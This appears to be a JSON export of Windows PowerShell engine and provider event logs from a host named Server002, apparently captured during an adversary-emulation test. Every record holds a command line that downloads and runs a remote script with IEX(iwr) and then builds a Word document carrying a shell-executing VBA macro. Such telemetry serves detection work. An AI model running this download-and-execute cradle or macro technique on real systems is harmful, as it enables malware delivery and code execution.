{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 17:48:13.0295408"},"EventRecordID":"1067","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=94c9465b-af37-4a3f-ac2a-e6be0f1f0f9b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\r\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 17:48:13.0378452"},"EventRecordID":"1068","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=94c9465b-af37-4a3f-ac2a-e6be0f1f0f9b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\r\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 17:48:13.0378452"},"EventRecordID":"1069","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=94c9465b-af37-4a3f-ac2a-e6be0f1f0f9b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\r\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 17:48:13.0435310"},"EventRecordID":"1070","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=94c9465b-af37-4a3f-ac2a-e6be0f1f0f9b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\r\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 17:48:13.0435310"},"EventRecordID":"1071","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=94c9465b-af37-4a3f-ac2a-e6be0f1f0f9b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\r\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 17:48:13.0574850"},"EventRecordID":"1072","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=94c9465b-af37-4a3f-ac2a-e6be0f1f0f9b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\r\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 17:48:13.3600190"},"EventRecordID":"1073","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=94c9465b-af37-4a3f-ac2a-e6be0f1f0f9b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\r\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=eebc74ae-8137-4724-bafd-7991f8a83f25\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 17:48:15.5757208"},"EventRecordID":"1074","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=16\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=94c9465b-af37-4a3f-ac2a-e6be0f1f0f9b\r\n\tHostApplication=powershell.exe &amp; {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\r\nIEX (iwr \"https://raw.githubusercontent.com/file/file-file/master/files/data.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\r\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\r\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=eebc74ae-8137-4724-bafd-7991f8a83f25\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
